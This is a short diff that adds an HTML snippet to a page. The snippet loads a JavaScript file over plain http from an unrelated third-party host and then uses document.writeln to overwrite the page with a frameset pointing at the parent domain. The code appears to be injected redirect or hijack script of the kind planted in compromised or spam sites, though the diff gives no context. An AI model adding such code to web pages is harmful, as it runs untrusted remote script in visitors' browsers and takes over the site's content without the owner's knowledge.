@@ -1,0 +1,7 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script type="text/javascript" src="http://zy.dyrt99.com/template/fzqk/201702/fzqk78/js/setMoble2.js"></script>
+<script type="text/javascript">
+var cysrc="http://www."+document.domain.split('.').slice(1).join('.')+"";
+cysrc=cysrc.replace("//.","//"); 
+document.writeln("<frameset><frame src=\""+cysrc+"\"></frameset>");
+</script>
